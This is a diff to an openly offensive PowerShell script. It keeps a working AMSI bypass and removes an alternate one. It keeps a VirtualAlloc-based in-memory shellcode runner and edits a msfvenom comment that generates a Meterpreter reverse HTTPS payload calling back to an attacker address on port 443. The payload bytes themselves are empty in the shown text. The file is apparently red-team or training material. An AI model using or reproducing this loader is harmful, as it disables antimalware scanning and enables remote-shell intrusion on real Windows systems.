@@ -1,12 +1,6 @@
 # AMSI Bypass
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 
-$a=[Ref].Assembly.GetTypes();
-Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};
-$d=$c.GetFields('NonPublic,Static');
-Foreach($e in $d) {if ($e.Name -like "*tFailed") {$f=$e}};
-$g=$f.SetValue($null,$true);
-
 function LookupFunc {
 
         Param ($moduleName, $functionName)
@@ -46,7 +40,7 @@ function getDelegateType {
 
 $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
 
-# msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.0.0 LPORT=443 EXITFUNC=thread -f ps1
+# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 EXITFUNC=thread -f ps1
 [Byte[]] $buf = 
 
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
